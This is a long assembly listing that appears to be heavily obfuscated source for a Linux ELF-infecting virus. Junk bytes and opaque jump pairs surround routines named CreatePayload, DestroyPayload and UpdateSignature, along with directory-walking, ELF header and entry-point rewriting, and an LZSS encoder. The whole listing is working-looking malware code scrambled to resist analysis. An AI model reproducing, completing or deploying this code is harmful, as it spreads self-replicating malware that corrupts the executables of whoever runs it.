    jmp         $+3
db 0x66
    jmp         ..@fQennTsGMy7s
..@QO4zB0COtU13:
    rep         nop
    jmp         $+3
db 0x27
    jmp         $+3
db 0x7f
    jl          ..@NtHGGRSp8mB7
    jge         ..@NtHGGRSp8mB7
..@pYrADYj24mlU:
    shl         edi, 0x8
    jmp         $+5
db 0x4e, 0x91, 0xdf
    jmp         $+5
db 0x4b, 0xa0, 0xe6
    jl          ..@4OKK9mSyLJ7W
    jge         ..@4OKK9mSyLJ7W
Strcpy:
    jmp         ..@F4uKyYGqX95D
..@rvXExtONXiVr:
    mov         rdi, rdi
    jmp         $+5
db 0x83, 0xa8, 0xe7
    jb          ..@eeEoVgKvihTG
    jae         ..@eeEoVgKvihTG
..@EgijrRIBp53g:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         ..@wAfuV5pgsS2i
..@o1PEkc9VjRWs:
    push        rsi
    jmp         $+5
db 0x85, 0x50, 0xbf
    jl          ..@AQ0tjXqVPoyF
    jge         ..@AQ0tjXqVPoyF
..@kuEZuvoVSdRI:
    xor         rcx, rcx
    jmp         $+3
db 0xb6
    jmp         $+5
db 0x28, 0xde, 0x8a
    js          ..@paJ8d6mzAuNm
    jns         ..@paJ8d6mzAuNm
..@mpbcXXsteA1L:
    ret
    jmp         Memset
..@UNGMEn1iVgfy:
    push        rcx
    js          ..@S5VPUgBpqz4E
    jns         ..@S5VPUgBpqz4E
..@SUYb3aOiqv1z:
    mov         rdx, rdx
    jl          ..@yNHYpfFMjyuz
    jge         ..@yNHYpfFMjyuz
..@OHKnkwWm2Cct:
    or          QWORD [r1+e_h.e_entry], 1b
    jmp         $+3
db 0x2f
    jb          ..@9R9ZCxar5SIA
    jae         ..@9R9ZCxar5SIA
..@6rFt0puU04xb:
    mov         r2w, WORD [r1+e_h.e_phnum]
    jmp         $+5
db 0xb0, 0xc1, 0xd2
    js          ..@ja6CgCqfUpb3
    jns         ..@ja6CgCqfUpb3
..@dlPeegwoH0nA:
    push        r2
    jmp         $+4
db 0xc7, 0x51
    jmp         ..@vLs8HC8MSUD8
..@kHTz2qKa33UU:
    mov         rax, rax
    jmp         $+3
db 0x6a
    js          ..@5urlhICq9vdS
    jns         ..@5urlhICq9vdS
..@2iVHwqr1BhME:
    push        rbx
    jmp         $+5
db 0xef, 0xa4, 0x73
    jmp         ..@jxQ8OnK566eF
..@8pFOKPohcQRX:
%ifdef X86_32
    mov         ecx, DWORD [edi+file.filesize]
%endif
    jb          ..@7WIlFYt5tMcd
    jae         ..@7WIlFYt5tMcd
..@8S3WDTHlsdUj:
    jg          ..@bFZPW1z368cQ
    jmp         $+3
db 0x3a
    je          ..@PYXSpNJvshkr
    jne         ..@PYXSpNJvshkr
..@9I0n4UlCkpaC:
    call        GetNewProgramVaddr
    jmp         ..@pSwFdok9ms2l
..@CADrYX6CWpn4:
    ret
    jmp         $+4
db 0x14, 0x23
    js          LzssEncoder
    jns         LzssEncoder
..@wfrqvJrnbNU5:
    mov         rdx, rdx
    jmp         $+3
db 0x33
    jmp         ..@b5sWKoaOnigT
..@ZQrdWTtdPM0p:
    pop         rsi
    jb          ..@ofHyr04rYA1o
    jae         ..@ofHyr04rYA1o
..@a8ExULZHrPs1:
    mov         r1, QWORD [rsp+_DYNPIE_OFF.ptr]
    jl          ..@Be8KGdbtd1bz
    jge         ..@Be8KGdbtd1bz
DestroyPayload:
    jmp         ..@SGHREBmASdKh
..@fqlHuUQvWp1A:
    rep         nop
    jmp         $+3
db 0xa9
    jmp         ..@xQxMNP39BQ1M
..@PY4zoGcW3FDe:
    mov         r1, r5
    jmp         $+3
db 0xb4
    jb          ..@bMPd2eaYjZKa
    jae         ..@bMPd2eaYjZKa
..@m1PdXKoAEKuF:
    xchg        rdx, rdx
    jl          ..@OJ2RGYPnin0S
    jge         ..@OJ2RGYPnin0S
..@12R8f8PnRzUj:
    pop         rbx
    jmp         $+4
db 0xee, 0xaf
    jb          ..@moNtBzBBsdcx
    jae         ..@moNtBzBBsdcx
..@Ou8FDSmyxfKz:
%ifdef X86_64
    xchg        rdx, rdx
%endif
    jmp         $+4
db 0x3c, 0x86
    jmp         $+3
db 0xfa
    jmp         $+3
db 0xdf
    js          ..@GjzVDEFnsgJP
    jns         ..@GjzVDEFnsgJP
..@DC84qsmGsVSp:
    pop         rbx
    jmp         $+5
db 0x55, 0xcc, 0x90
    jmp         ..@nl6xvnOOfQJH
..@iYu36yPJxVcR:
    mov         WORD [rsp+_PAYLOAD_OFF.index], r2w
    jmp         $+3
db 0x1b
    jmp         ..@Zjf2kHfcHcts
..@O2ugmylaCPav:
    add         r4, rax
    js          ..@Ui5WzWvq0CS6
    jns         ..@Ui5WzWvq0CS6
..@FpKd1qu1QhlZ:
    mov         rbx, rbx
    jmp         $+3
db 0xf8
    jl          ..@BymCZe7qj7sZ
    jge         ..@BymCZe7qj7sZ
..@Ll00HWPuNCXC:
    xor         rcx, rcx
    jl          ..@kEe01QzSeEts
    jge         ..@kEe01QzSeEts
..@NNaZORfplShL:
    cmp         BYTE [r1+4], ELFCLASS
    jmp         $+4
db 0x4e, 0x2e
    jmp         $+4
db 0x76, 0x4f
    jmp         ..@xUfu35yEkeu5
..@RjLzjJ9BsEJR:
    pop         rsi
    jmp         $+4
db 0x74, 0xa9
    jmp         $+4
db 0xe3, 0x5d
    js          ..@jMiiXURLveTs
    jns         ..@jMiiXURLveTs
..@ORntJQay9ZcZ:
    mov         rbx, 0x1000
    jmp         $+3
db 0x15
    jmp         ..@vZkMqeHkPxsv
..@MDDyXzocps48:
    mov         r2, m8
    jmp         $+3
db 0x52
    jmp         ..@NuHQ7moaL0yY
..@4ShEW0PDAaMw:
    xchg        rsp, rsp
    jmp         $+5
db 0x59, 0xc4, 0x5d
    jb          ..@gKAtkyUEUkXW
    jae         ..@gKAtkyUEUkXW
..@eZI7Lgisg2Ee:
    mov         rbp, rbp
    jb          ..@XIpWo3VFd9Xj
    jae         ..@XIpWo3VFd9Xj
..@C1UJmBsvKrKt:
    push        rsi
    jmp         $+5
db 0x12, 0x52, 0xd8
    jmp         ..@okTvbtkb21R5
..@RrLjqDC7gPWj:
    push        rdi
    jb          ..@5rO8wKQLBxUN
    jae         ..@5rO8wKQLBxUN
..@3qhWbGSZwfup:
    mov         rdi, rdi
    jmp         ..@bbePXKXkCRMp
..@0mrFqDe6RyTX:
    xchg        rbx, rbx
    jmp         $+3
db 0xe9
    js          ..@kvxyBBVN23xy
    jns         ..@kvxyBBVN23xy
..@jxQ8OnK566eF:
    pop         rbx
    jmp         $+5
db 0x14, 0xc7, 0xf6
    jmp         ..@7vVPQRgSACj6
..@koKjsDKLHddU:
    mov         rdi, rdi
    jmp         $+5
db 0x7a, 0xa9, 0x8d
    jmp         ..@YRPtHNW5hy1P
..@wIa3QckWU6nZ:
    xor         rcx, rcx
    jmp         ..@fn1FZTXZt4Mf
..@3ElBOGPS6mHB:
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         $+4
db 0xe1, 0x2c
    jl          ..@EGljoSeaTkGf
    jge         ..@EGljoSeaTkGf
..@SRbZek2lD3s6:
    pop         rax
    jmp         $+4
db 0x6e, 0x48
    jmp         ..@TMosaXpMxZQ6
..@WlxT8XsfD3bQ:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], dl
    jmp         $+5
db 0x43, 0xdb, 0x23
    jmp         $+3
db 0xb7
    jmp         ..@LKeDIddv3ns2
..@IAf47shGkLpZ:
    movzx       rax, BYTE [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_reclen+r4]
    jl          ..@Vv6Xwbm8aKMc
    jge         ..@Vv6Xwbm8aKMc
..@vFPQT1zaSjyP:
    pop         rdi
    je          ..@rcVN1ghEfc3h
    jne         ..@rcVN1ghEfc3h
..@nljE7b7PdtMy:
    xchg        rsi, rsi
    jl          ..@YnuTD8Sufe1H
    jge         ..@YnuTD8Sufe1H
..@v4c59wrp7Ccw:
    xchg        rax, rax
    jmp         ..@vu9XzzRbA1In
..@fABKfm2fG3SN:
    cmp         eax, 0x3
    jmp         $+3
db 0xd1
    jmp         ..@H71Npagh1Fii
..@alxXp5ZiUAdx:
    cmp         WORD [r1], './'
    jl          ..@C2U9GmmmEEPc
    jge         ..@C2U9GmmmEEPc
..@RY09oVOptakE:
    push        r5
    jmp         $+3
db 0x68
    jb          ..@XhazY5AyDzq2
    jae         ..@XhazY5AyDzq2
..@5ScuQlyFROMZ:
    jge         ..@oxGXG78794JD
    jmp         $+3
db 0x59
    jmp         $+4
db 0x0e, 0x0b
    js          ..@YDfFZXtQKVMy
    jns         ..@YDfFZXtQKVMy
..@bFZPW1z368cQ:
    pop         r1
    jmp         $+5
db 0xfe, 0x32, 0x0b
    jmp         $+3
db 0x32
    jmp         $+5
db 0xd7, 0x9d, 0x15
    jmp         ..@V3RPPSRyhyNE
..@YnuTD8Sufe1H:
    ret
    js          UpdateSignature
    jns         UpdateSignature
..@KzAGNWH03MVu:
    add         rsp, _DYNPIE_OFF_size
    jmp         $+3
db 0xc9
    jmp         ..@Dz8HfwN1Jodl
..@uOny6NAV4TUn:
    mov         rcx, rcx
    jmp         ..@ncwfqF4ZbmI6
..@vZkMqeHkPxsv:
    sub         rbx, r3
    js          ..@rBUlJjBfAyXS
    jns         ..@rBUlJjBfAyXS
..@aS5uDmBV6U5j:
    cmp         r3, 0x00
    jb          ..@i4cNDjDorhkg
    jae         ..@i4cNDjDorhkg
..@Ur5xDAuJAFSP:
    push        r1
    jmp         $+4
db 0x82, 0x64
    jmp         $+5
db 0x0a, 0x73, 0xbc
    jl          ..@N3zJjGmNgXdi
    jge         ..@N3zJjGmNgXdi
..@OGYpNOdhTBo2:
    mov         rsp, rsp
    jmp         ..@hPcZPZjeoaRV
..@nnxl2yJ1SV5L:
    xchg        rdx, rdx
    jb          ..@LnLZs0fLP5BI
    jae         ..@LnLZs0fLP5BI
..@ixUrK4LjV2uI:
%ifdef X86_32
    pop         ebp
%endif
    jl          ..@9TrV9T48fLHd
    jge         ..@9TrV9T48fLHd
..@jSxP9rQMRbn7:
    mov         rbp, rbp
    jmp         $+4
db 0x00, 0xac
    jmp         $+3
db 0xd6
    jmp         $+3
db 0xd8
    jb          CreatePayload
    jae         CreatePayload
..@SRbAObJDNy4S:
    pop         rsi
    jmp         $+4
db 0x6e, 0xbb
    jmp         $+4
db 0xce, 0xef
    jb          ..@PjiAVf9PfOyn
    jae         ..@PjiAVf9PfOyn
..@OwqKZhT7JjNH:
    push        rdx
    jb          ..@5SUhUJ63n3Ic
    jae         ..@5SUhUJ63n3Ic
..@P2lExKKIAChR:
    push        rax
    jmp         ..@St2xcHiTxam8
..@WtMFapMIgb1d:
    pop         rdx
    jmp         $+3
db 0xe3
    jmp         $+3
db 0x8e
    jmp         $+4
db 0xdf, 0xc3
    jmp         $+4
db 0x35, 0xd1
    js          ..@dtf4mPobASsh
    jns         ..@dtf4mPobASsh
..@JOow0reITL5x:
    pop         rbx
    jmp         $+4
db 0x31, 0x4e
    js          ..@80M9GAdayfJT
    jns         ..@80M9GAdayfJT
..@IrzKOsAsa5I1:
    syscall
    jmp         $+4
db 0x36, 0xf8
    jl          ..@ZmDEwi4JyyRw
    jge         ..@ZmDEwi4JyyRw
..@9R9ZCxar5SIA:
    xchg        rsp, rsp
    jmp         $+4
db 0x39, 0x5e
    js          ..@JuFL6rDDHKnT
    jns         ..@JuFL6rDDHKnT
..@1GuXtI0C9zUX:
    cmp         rax, 0xffffffffffffffff
    jl          ..@pfPQifRIScUM
    jge         ..@pfPQifRIScUM
..@gANopjKEe4st:
    xor         rcx, rcx
    jmp         ..@cDaickq7mmCh
..@1PriOCwVSsob:
    push        rax
    jmp         $+4
db 0xce, 0x64
    jmp         $+3
db 0x19
    jmp         $+5
db 0x4f, 0xf0, 0xa9
    jmp         $+3
db 0x11
    jb          ..@sfFQ4S64rvmD
    jae         ..@sfFQ4S64rvmD
..@T4o9vxui4cNc:
    OFILE       [r1], 0x10000
    jmp         ..@gc7Bv2jrZisx
..@v5U42yPW76Gt:
    jnz         ..@FIHHdpNVP0mD
    jmp         ..@Fc3EFx361vbW
..@5QCHL9VYS9cC:
    je          ..@uFfkLHi4ZgFg
    js          ..@EjnOtIVLXz7J
    jns         ..@EjnOtIVLXz7J
..@MFEe2gXNI9uo:
    xchg        rsp, rsp
    jmp         $+4
db 0x8a, 0x21
    jmp         $+5
db 0x55, 0x0b, 0xe9
    jmp         $+3
db 0x2d
    jl          ..@W0SwTT5PxPL3
    jge         ..@W0SwTT5PxPL3
..@N3zJjGmNgXdi:
    mov         r2, QWORD [r1+file.filename]
    jmp         $+5
db 0x29, 0x02, 0xe5
    jmp         $+5
db 0x12, 0xc1, 0x4e
    jb          ..@0U1p9Ged8kZJ
    jae         ..@0U1p9Ged8kZJ
..@sVjYmmF2us71:
    pop         rcx
    jmp         $+5
db 0x71, 0x64, 0x14
    js          ..@kmIT772b388x
    jns         ..@kmIT772b388x
..@iiOo3hIkj0Jc:
    pop         rsi
    jmp         $+4
db 0xb2, 0x6f
    jmp         $+5
db 0x90, 0x54, 0xbf
    jmp         ..@mw9VcIjP0Kdg
..@jbIVqxuLg3Sj:
    push        rdi
    jmp         $+5
db 0x4b, 0x75, 0xbc
    jl          ..@FkrrkZtAxK6e
    jge         ..@FkrrkZtAxK6e
..@9sgbqA6Z33VF:
    mov         rsi, rsi
    jmp         $+4
db 0xdb, 0xf1
    jmp         $+4
db 0xd0, 0xe0
    js          ..@C0aE2XA9iH3g
    jns         ..@C0aE2XA9iH3g
..@ba14y4TcSfOQ:
    add         r1, 1
    jmp         $+3
db 0x9a
    jmp         $+4
db 0xef, 0x37
    jmp         $+3
db 0xdf
    jmp         ..@AutnemTLb2WA
..@SuRYsmJF7CAV:
    push        rdx
    jmp         ..@9V07tQUiRFjz
..@4bWUDyoVVSl0:
    mov         QWORD [r5+file.fileptr], rax
    jmp         $+3
db 0x05
    jb          ..@ZwSuzT6KTVoQ
    jae         ..@ZwSuzT6KTVoQ
..@flrd3ZpZUcGv:
    cmp         r4, 0x00
    jmp         ..@kAXVoAcDrb5D
..@2KPNGwDV3KbY:
    push        rcx
    jmp         $+5
db 0x82, 0xf6, 0x70
    jmp         ..@HgDrtAhhiO8F
..@Z7paKUeNAECx:
    jmp         Strcpy
    jmp         $+5
db 0xdd, 0x53, 0x21
    jb          ..@mpbcXXsteA1L
    jae         ..@mpbcXXsteA1L
..@oxGXG78794JD:
    push        rdx
    jmp         $+3
db 0x5c
    jmp         $+4
db 0x4f, 0xe7
    jb          ..@UYIL1OipLzMc
    jae         ..@UYIL1OipLzMc
..@jqqtOCo4UyyE:
    xor         rdx, rdx
    jmp         $+4
db 0x0c, 0x65
    jmp         $+5
db 0x9c, 0x37, 0x45
    jmp         ..@uQQN8vtE9CgJ
..@v3mveS4J6yjf:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    je          ..@GwA8NfzbtNrr
    jne         ..@GwA8NfzbtNrr
..@y7AitoRU2LXI:
    mul         r3 
    jmp         $+4
db 0x45, 0xaa
    jmp         $+4
db 0xbe, 0x4f
    jmp         ..@Xo3EDT4hd4mF
..@rSMepkUisf3K:
    sub         rsp, _INFDIR_OFF_size
    jmp         $+4
db 0x16, 0xb7
    jmp         ..@tbbJBk6pnaLI
..@RPx5fR2AY44R:
    push        rdi
    jb          ..@824wRRbOEblh
    jae         ..@824wRRbOEblh
..@i5YuPeckps0a:
    push        rsi
    jmp         $+4
db 0x1f, 0x2c
    js          ..@ewMzshVCHb4H
    jns         ..@ewMzshVCHb4H
..@KTjI7zGfAA5G:
    mov         rbx, rbx
    jl          ..@gmuPnC6r2UBs
    jge         ..@gmuPnC6r2UBs
..@V2YJm6EtYHPl:
    mov         r2, 1
    js          ..@BQD45wvayTti
    jns         ..@BQD45wvayTti
..@yZ13OWDX30xT:
    mov         rax, rax
    jmp         $+4
db 0xfb, 0xde
    js          ..@T4o9vxui4cNc
    jns         ..@T4o9vxui4cNc
..@3cz6Nr8xhetG:
    pop         rdi
    jl          ..@4aKGEtYNITlk
    jge         ..@4aKGEtYNITlk
..@wFxocBU2YaRp:
    cmp         r4w, WORD [r1+e_h.e_phnum]
    jmp         $+3
db 0x73
    jmp         $+4
db 0x44, 0x55
    jmp         ..@y01BFO49ezwE
..@ZKfiVOM4vLFk:
    call        IsNum
    je          ..@C1ODMg2qBTna
    jne         ..@C1ODMg2qBTna
..@G5jCeoPXwYTP:
%ifdef X86_32
    mov         eax, SYS_MMAP2
%endif
    jmp         ..@YsBLJwviXDzZ
..@WQEI7032jVii:
    xchg        rax, rax
    jmp         $+4
db 0xcd, 0x69
    jmp         ..@UoxzUOIei4UV
..@tJ45c3bYQF4s:
    pop         rbx
    jmp         $+3
db 0x06
    je          ..@nGksz0A4eFEn
    jne         ..@nGksz0A4eFEn
..@7D1cpw33tDqm:
    pop         rbx
    jmp         $+4
db 0x41, 0xaa
    js          ..@fy0gZUe9usZg
    jns         ..@fy0gZUe9usZg
..@JdhpUpvP2IqU:
    pop         r4
    jmp         $+5
db 0xfe, 0x26, 0x04
    js          ..@Jn2jX18Mbdha
    jns         ..@Jn2jX18Mbdha
..@He9XZsAIiMZA:
    jnz         ..@b57s9zdrznFN
    jmp         $+5
db 0xe9, 0x9f, 0xe2
    js          ..@YRKXbaHBxVRk
    jns         ..@YRKXbaHBxVRk
..@aZqORkrCzNaO:
    mov         rbp, rbp
    jmp         $+4
db 0xe8, 0xb5
    jl          ..@YiDwDIlEsyzP
    jge         ..@YiDwDIlEsyzP
..@s9aHY8Uo9dAx:
    xchg        rbx, rbx
    jmp         ..@9sXd7x5afgmN
..@ClFHwFKm8dMm:
    jl          ..@8NCjFeuoEttB
    jl          ..@U9ER4yxuWlYf
    jge         ..@U9ER4yxuWlYf
..@glHApS6TgR3e:
    test        r2, r2
    jmp         $+4
db 0xca, 0xb9
    jl          ..@SKCQZEy1Ixkd
    jge         ..@SKCQZEy1Ixkd
..@qcs33qkB5clN:
    mov         DWORD [rsp+_INFDIR_OFF.dirfd], eax
    jb          ..@JISh5mJkrJz1
    jae         ..@JISh5mJkrJz1
..@uHj0lHuAEHDe:
    OFILE       [rsp+_PROC_OFF.buffer], 0x00
    jmp         $+5
db 0xd7, 0x05, 0x46
    js          ..@kr7zRQgMfPKO
    jns         ..@kr7zRQgMfPKO
..@ewMzshVCHb4H:
    mov         rax, rax
    jb          ..@dnreW6vEBR6a
    jae         ..@dnreW6vEBR6a
..@rnReCwAMxLS5:
    pop         rdi
    jmp         ..@zEN3QjHBp9a1
..@WNZ5t4ZPTbbl:
    mov         r1, r5
    jb          ..@6FXIjvbLXp3I
    jae         ..@6FXIjvbLXp3I
..@z7EMNV8fsudB:
    pop         rax
    jl          ..@TIcwmgzRqkXo
    jge         ..@TIcwmgzRqkXo
..@Pyk5NtK2MdQd:
    add         r2, e_h.e_shoff
    jmp         $+3
db 0x2a
    jmp         ..@Xbxm9cEbWC9h
..@E9v9RnTKxpq1:
    cmp         rdi, rsi
    jmp         $+5
db 0x85, 0xec, 0x82
    js          ..@bCg29lnUyAzg
    jns         ..@bCg29lnUyAzg
..@JY50Y9mKh4TV:
    xchg        rsi, rsi
    jmp         ..@tEAmyLrBm6CF
..@48OTMUrC9ZHt:
    mov         rdi, rdi
    jmp         $+5
db 0xd7, 0x72, 0x7c
    js          ..@LhV8XrKyJJqV
    jns         ..@LhV8XrKyJJqV
..@zu212Sn3G7Z2:
    push        rcx
    jmp         $+3
db 0x94
    js          ..@krYlbOuUGuD4
    jns         ..@krYlbOuUGuD4
..@afO8R3NX2di8:
    jnz         ..@aBwQ5Wjgk3Kh
    jb          ..@fguSZHCUuTXt
    jae         ..@fguSZHCUuTXt
..@oCTV4ZNupbda:
    add         r1, rax
    jmp         $+3
db 0xd9
    jmp         $+4
db 0x24, 0xca
    jmp         $+5
db 0x9c, 0x40, 0xc6
    jl          ..@sNhyN3KrsWOO
    jge         ..@sNhyN3KrsWOO
..@TmsoCiyq9i0W:
    xchg        rax, rax
    jmp         ..@sT37yvhqgqgW
..@yxhoR6CI9Djg:
    mov         rbx, rbx
    jmp         $+5
db 0x68, 0xb3, 0x38
    je          ..@bY1Bpqoe3MJp
    jne         ..@bY1Bpqoe3MJp
..@HPF4FIpg7AiG:
    jle         ..@jO5fGnCutNi9
    je          ..@BsWS0ZldLG1w
    jne         ..@BsWS0ZldLG1w
..@UuGEL3jBboBb:
    VAR         packed, procdir
    je          ..@mrY5qttxZe8z
    jne         ..@mrY5qttxZe8z
..@5urlhICq9vdS:
    push        rbx
    jmp         $+3
db 0x60
    jmp         $+4
db 0x36, 0x17
    je          ..@EMlbQkc8z582
    jne         ..@EMlbQkc8z582
..@tGGU9X3zGCzx:
    jmp         ..@JUEP3gNe55yH
    jmp         $+4
db 0x8c, 0xe6
    jmp         $+3
db 0x26
    js          ..@blO6OJT6QbvM
    jns         ..@blO6OJT6QbvM
..@QqV2t0LyOjSe:
    ret
    jmp         $+4
db 0x7e, 0x9a
    js          ..@BeGs152k8juK
    jns         ..@BeGs152k8juK
..@pkDsMyFfGgLL:
    cmp         rax, 0x00
    jmp         ..@Qc3Hv2Hi6FiF
..@hhwN9DYE2lrp:
    xchg        rdi, rdi
    jmp         $+3
db 0x91
    js          ..@V3Z7TFJ9uDW2
    jns         ..@V3Z7TFJ9uDW2
..@2N5Bv7TPrYD6:
    push        rsi
    jmp         $+4
db 0x76, 0xc5
    js          ..@yqMeuztPoZz3
    jns         ..@yqMeuztPoZz3
..@SdOCx5gUs3dv:
    call_vsp    Strncmp
    jmp         $+5
db 0x5e, 0xe4, 0x1f
    jmp         ..@UkNUNiE62tgA
..@1eRH1Q40Urrk:
    mov         r3, non_packed_len
    je          ..@SiakyLf03pMx
    jne         ..@SiakyLf03pMx
..@Ux4Q4kOFU5Zv:
    cmp         BYTE [r2], 0x0
    jmp         $+5
db 0x9b, 0x63, 0x11
    jmp         $+5
db 0x24, 0xb9, 0x24
    jmp         ..@gCMgAywP0qhx
..@OnCu9N8ByddC:
    push        rdi
    jl          ..@bSf6uP4RJWJI
    jge         ..@bSf6uP4RJWJI
..@K26B2GsbQIxX:
    mov         rdi, rdi
    jmp         ..@Dfyt35FL1fC3
..@PYXSpNJvshkr:
    mov         rsp, rsp
    jmp         $+3
db 0x52
    jb          ..@V2YJm6EtYHPl
    jae         ..@V2YJm6EtYHPl
..@eKtTQ38OWGQP:
    push        r3
    jl          ..@Hgzj0ncJunam
    jge         ..@Hgzj0ncJunam
..@54MQlWU9zcxF:
    xor         rax, rax
    jb          ..@NceWYP8dRS1B
    jae         ..@NceWYP8dRS1B
..@8aMrWVqFCOfN:
    mov         QWORD [rsp+_VADDR_OFF._vaddr], 0
    jb          ..@tAXrk7vltk9i
    jae         ..@tAXrk7vltk9i
..@KBwZRT8Ojbxz:
    rep         nop
    jmp         $+3
db 0xc6
    jl          ..@FCkAF0sLln4d
    jge         ..@FCkAF0sLln4d
..@tEAmyLrBm6CF:
    push        rcx
    jl          ..@G6OAeSBvzGtX
    jge         ..@G6OAeSBvzGtX
..@9Rm7pqmbc5kl:
    push        rdi
    jmp         ..@xsI7a58JXGdZ
..@SWCnLWg9H83q:
    xchg        rsp, rsp
    jmp         $+5
db 0x54, 0xc6, 0xf8
    js          ..@jRaDiEWAihv3
    jns         ..@jRaDiEWAihv3
..@jEzMGlcWbNlc:
    cmp         r5, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    js          ..@iid7sJQoTDkt
    jns         ..@iid7sJQoTDkt
..@tzak3mOOc5wW:
    xor         r4, r4
    jl          ..@lvEPTtri0RHF
    jge         ..@lvEPTtri0RHF
..@DjM5W8nZYQUy:
    mov         rcx, rcx
    jmp         ..@KTgcw0a8juDE
..@1FBpREFioTzW:
    rep         nop
    jmp         $+3
db 0x68
    js          ..@4OPMIHIjZWOO
    jns         ..@4OPMIHIjZWOO
..@CfT8ZQe1403P:
    mov         rdi, rdi
    js          ..@2ePx5yHS4MGD
    jns         ..@2ePx5yHS4MGD
..@lKzA66FOd7uk:
    xor         r1, r1
    jmp         $+5
db 0x43, 0x6a, 0x75
    jmp         ..@k8pUh766ZAP8
..@6eFCN59YyKiE:
    push        rcx
    jl          ..@XvphT8vened6
    jge         ..@XvphT8vened6
..@JtcNLxkiYYAT:
    mov         rax, rax
    jmp         $+4
db 0x5b, 0x5f
    je          ..@LRarJbTznoH0
    jne         ..@LRarJbTznoH0
..@qwiXY54JiRzd:
    jle         ..@CcixghylXLa7
    je          ..@B6l11FuiIVCS
    jne         ..@B6l11FuiIVCS
..@vXQUTpx1Qp0P:
    mov         BYTE [r1], '/'
    je          ..@cdOlhyErjEpY
    jne         ..@cdOlhyErjEpY
..@wiuajMHz79qp:
    pop         rdi
    jmp         ..@gixd21FU7PYj
..@xqBhJHaLb2u7:
    xchg        rsi, rsi
    jmp         $+5
db 0xb9, 0x05, 0x62
    jmp         ..@eBJOZTbPXYdM
..@l1GD1rbAR5KF:
    push        rax
    jmp         ..@UV9gA4lDeRCx
..@6lxjuSSxfcBT:
    mov         rsi, rsi
    jmp         $+5
db 0x79, 0x4f, 0x65
    js          ..@KBwZRT8Ojbxz
    jns         ..@KBwZRT8Ojbxz
..@HFNFSdH4hitH:
    pop         rdi
    js          ..@VL4CrQiC56hA
    jns         ..@VL4CrQiC56hA
..@Xxa15DwHFROT:
    mov         r2d, DWORD [r1]
    jb          ..@D9DSLc2b4CIO
    jae         ..@D9DSLc2b4CIO
..@JISh5mJkrJz1:
    ODIR        [rsp+_INFDIR_OFF.dirfd], [rsp+_INFDIR_OFF.dirbuf], DIRENT_BUFSIZE
    jmp         $+3
db 0x6d
    jmp         ..@pkDsMyFfGgLL
..@KISbk5I15ixW:
%ifdef X86_64
    xor         r9, r9
%endif
    jmp         $+5
db 0x50, 0x65, 0x6b
    jmp         $+5
db 0x07, 0x51, 0xfd
    jmp         $+5
db 0x88, 0x7a, 0xa1
    jmp         ..@DEMLzZ7OPauk
..@Xbxm9cEbWC9h:
    add         r1, QWORD [r2]
    jmp         $+4
db 0x93, 0xa9
    jl          ..@iBAvQRypQjsl
    jge         ..@iBAvQRypQjsl
..@qYjRZIO5jobn:
    mov         rdx, rdx
    jmp         $+3
db 0x06
    jb          ..@2KPNGwDV3KbY
    jae         ..@2KPNGwDV3KbY
..@RSVCoa0ByGXh:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         $+3
db 0x24
    jb          ..@l7Wbxvdd45qM
    jae         ..@l7Wbxvdd45qM
..@W0SwTT5PxPL3:
    mov         rbp, rbp
    jmp         $+4
db 0x21, 0xfa
    jmp         ..@fX4VttTD6iq6
..@Kd47DUc13sHo:
    pop         rdi
    js          ..@R3tFLnN2IFB0
    jns         ..@R3tFLnN2IFB0
..@mw9VcIjP0Kdg:
    mov         rdx, rdx
    js          ..@kkF7Dl5tTRhW
    jns         ..@kkF7Dl5tTRhW
..@Xo3EDT4hd4mF:
    mov         r5, QWORD [r4+rax+p_h.p_vaddr]
    je          ..@FpnH3Kz1R9iK
    jne         ..@FpnH3Kz1R9iK
..@cGMew5VjG5bs:
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    jmp         $+3
db 0x75
    jl          ..@Jcjr1QU9yeH0
    jge         ..@Jcjr1QU9yeH0
..@b5sWKoaOnigT:
    mov         edx, 1
    jmp         $+5
db 0x18, 0xb8, 0xde
    js          ..@Yqyks4wmjocc
    jns         ..@Yqyks4wmjocc
..@O8lvxn3sByEZ:
    call        MemMove
    jmp         $+4
db 0xa9, 0xf3
    jmp         $+4
db 0xa1, 0xe4
    jmp         $+4
db 0x2a, 0xa5
    jmp         ..@NHiWgjq2uMGf
..@9TrV9T48fLHd:
%ifdef X86_64
    xor         rax, rax
%endif
    jmp         $+3
db 0xc6
    jb          ..@Hy4Pa1YGw18E
    jae         ..@Hy4Pa1YGw18E
..@kDQPqHguryA5:
    xchg        rdx, rdx
    jmp         $+4
db 0xda, 0x84
    jmp         ..@rgQ99Cr6iMte
..@Xcsq7B63ZiSR:
    mov         rax, (-1)
    jmp         ..@9LVhT36zfxnk
..@8OT9K5dcvd9L:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    jmp         $+5
db 0x16, 0x43, 0x83
    jl          ..@newxpJKxin40
    jge         ..@newxpJKxin40
..@3771BcLvovb9:
%ifdef X86_64
    pop         rbx
%endif
    jmp         ..@ZaxkTge3m3wl
..@7OQTHUCegOpC:
    push        rdi
    jmp         ..@l5gACJY1DpuF
..@aeRWYVfmQGzl:
%ifdef X86_64
    xchg        rsi, rsi
%endif
    jl          ..@Ou8FDSmyxfKz
    jge         ..@Ou8FDSmyxfKz
..@7Z9aEBDO4ULM:
    mov         rbx, rbx
    jmp         $+5
db 0xb6, 0x4b, 0x17
    jmp         ..@XPelEnNSvpJA
..@Hyy8NfHAyLvn:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    jl          ..@z6nrhm1iR3uJ
    jge         ..@z6nrhm1iR3uJ
..@vx2akbBQrcmv:
    xor         r3, r3
    jb          ..@ifDsA4n7RsHF
    jae         ..@ifDsA4n7RsHF
..@EjR7NszFEnEK:
    mov         r5, r1
    jmp         $+4
db 0x8d, 0x8f
    js          ..@8MpCqIxbutEi
    jns         ..@8MpCqIxbutEi
..@Dfyt35FL1fC3:
    sub         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH
    jb          ..@iNUqmU64UCFW
    jae         ..@iNUqmU64UCFW
..@DUas4jJMsDwK:
    push        rbx
    jmp         $+4
db 0x2d, 0xe2
    jmp         $+4
db 0x78, 0x08
    jmp         ..@h2gOedMrn6z3
